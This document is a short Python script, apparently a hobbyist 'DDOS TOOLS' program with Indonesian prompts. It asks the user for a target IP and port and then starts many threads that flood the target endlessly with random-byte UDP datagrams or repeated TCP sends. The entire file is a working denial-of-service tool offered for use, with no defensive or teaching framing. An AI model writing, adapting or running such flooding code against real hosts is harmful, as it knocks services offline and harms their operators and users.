#!/usr/bin/env python3
#Code by D4P1
import random
import socket
import threading

print("-- DDOS TOOLS BY : D4P1 --")
ip = str(input(" MEBERI PAKET KE IP:"))
port = int(input(" Paket PORT:"))
choice = str(input(" SIAP? (Y/N):"))
times = int(input(" Jumlah perkoneksi:"))
threads = int(input(" Jumlah JUMLAH P4K3T:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" MENTAL DOWN!!!")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" NIH PAKET FROM D4P1!!!")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
